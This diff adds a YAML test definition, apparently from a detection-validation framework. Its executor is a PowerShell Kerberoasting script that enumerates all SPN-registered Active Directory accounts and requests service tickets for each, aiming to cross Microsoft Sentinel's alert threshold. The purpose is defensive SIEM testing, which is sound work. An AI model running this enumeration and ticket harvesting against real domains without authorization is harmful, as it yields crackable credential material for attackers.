@@ -1,0 +1,87 @@
+id: AZURE_kerberoasting
+name: Sentinel - Potential Kerberoasting Detection
+description: >
+  Sentinel-optimized Kerberoasting variant. Enumerates ALL SPN-registered service
+  accounts and requests TGS tickets for each, crossing the Sentinel "Potential
+  Kerberoasting" rule threshold (15+ distinct SPNs in 1 hour). Unlike T1558.003
+  which requests a few tickets, this variant maximizes volume to trigger the
+  Sentinel KQL-based analytic rule. Generates EID 4769 (KerbTicket TGS request
+  with EncryptionType=0x17 RC4-HMAC) on the Domain Controller. Zero Azure
+  connectivity required — Sentinel AMA/MMA agent forwards Security events.
+tactic: credential-access
+technique_id: T1558.003
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - event_id: 4769
+    channel: "Security"
+    description: "Kerberos TGS request - TicketEncryptionType=0x17 RC4-HMAC — Sentinel Potential Kerberoasting trigger"
+  - event_id: 4688
+    channel: "Security"
+    description: "setspn.exe SPN enumeration process creation"
+  - event_id: 4104
+    channel: "Microsoft-Windows-PowerShell/Operational"
+    description: "PowerShell ScriptBlock - KerberosRequestorSecurityToken bulk requests"
+tags:
+  - credential-access
+  - active-directory
+  - sentinel-targeted
+siem_coverage:
+  sentinel:
+    - "Potential Kerberoasting"
+executor:
+  type: powershell
+  command: |-
+    Write-Host "[AZURE_kerberoasting] Sentinel Kerberoasting Detection — Volume Threshold Trigger"
+    Write-Host "Targets Sentinel 'Potential Kerberoasting' rule (15+ distinct SPN requests in 1h)"
+
+    # Phase 1: Broad SPN enumeration — all service accounts
+    Write-Host "--- Phase 1: Broad SPN enumeration (all service accounts) ---"
+    Add-Type -AssemblyName System.IdentityModel
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher
+    $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $searcher.PropertiesToLoad.AddRange(@("servicePrincipalName","sAMAccountName"))
+    $results = $searcher.FindAll()
+    Write-Host "SPN-enabled service accounts found: $($results.Count)"
+
+    # Phase 2: Request TGS for EACH SPN — volume to cross Sentinel threshold
+    Write-Host "--- Phase 2: Bulk TGS requests (EID 4769 on DC per request) ---"
+    $spns = @()
+    foreach ($r in $results) {
+        foreach ($spn in $r.Properties["serviceprincipalname"]) {
+            $spns += $spn
+        }
+    }
+    # Add machine SPNs as fallback for environments with few service accounts
+    $spns += "HOST/$env:COMPUTERNAME"
+    $spns += "HOST/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+    $spns += "CIFS/$env:COMPUTERNAME"
+    $spns += "CIFS/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+    $spns += "HTTP/$env:COMPUTERNAME"
+    $spns += "WSMAN/$env:COMPUTERNAME"
+    $spns += "RestrictedKrbHost/$env:COMPUTERNAME"
+    $spns += "TERMSRV/$env:COMPUTERNAME"
+    $spns += "LDAP/$env:COMPUTERNAME"
+    $spns += "DNS/$env:COMPUTERNAME"
+
+    $requested = 0
+    foreach ($spn in ($spns | Select-Object -Unique)) {
+        try {
+            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+            $requested++
+            Write-Host "  TGS #$requested for: $spn"
+        } catch { }
+    }
+    Write-Host "Total TGS tickets requested: $requested (Sentinel threshold: 15)"
+
+    # Phase 3: setspn.exe enumeration (EID 4688)
+    Write-Host "--- Phase 3: setspn.exe enumeration (EID 4688) ---"
+    setspn.exe -T $env:USERDNSDOMAIN -Q */* 2>&1 | Select-Object -First 10 | Write-Host
+
+    # Phase 4: klist verification
+    Write-Host "--- Phase 4: klist — acquired tickets ---"
+    klist 2>&1 | Select-String "Service Name|Encryption Type" | Write-Host
+
+    Write-Host "[AZURE_kerberoasting] Complete. $requested TGS requests sent. Check EID 4769 EncryptionType=0x17."
+cleanup: ""
